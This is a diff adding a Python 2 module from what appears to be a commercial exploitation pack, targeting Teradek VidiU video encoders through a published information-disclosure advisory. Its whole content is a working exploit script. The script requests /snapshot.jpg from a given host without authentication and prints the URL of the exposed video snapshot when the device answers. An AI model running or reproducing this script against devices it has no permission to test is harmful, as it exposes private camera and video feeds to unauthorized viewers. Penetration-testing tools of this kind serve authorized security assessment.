@@ -1,0 +1,39 @@
+#! /usr/bin/env python2
+ 
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2018
+#
+
+###
+# STD modules
+###
+import os, sys, re
+import requests
+
+_name_   = 'd2sec_teradek_1'
+_vendor_ = 'teradek'
+_model_  = ['VidiU']
+_vuln_   = 'Information Disclosure'
+_cve_    = ''
+_ref_    = 'https://www.zeroscience.mk/en/vulnerabilities/ZSL-2018-5462.php'
+_port_   = 80
+
+def pwnrouter(host,port=_port_):
+  try:
+    url = "http://%s:%s/snapshot.jpg" % (host,port)
+    response = requests.get(url, verify=False)
+  except Exception, e:
+    print '[-] error : %s' % e
+    return
+  if response.status_code != 200:
+    print '[+] %s not vulnerable' % host
+  else :
+    print '[+] %s vulnerable' % host 
+    print '[+] Video stream snapshot available here: %s' % url 
+
+
+if __name__ == "__main__":
+  pwnrouter(sys.argv[1], int(sys.argv[2]))
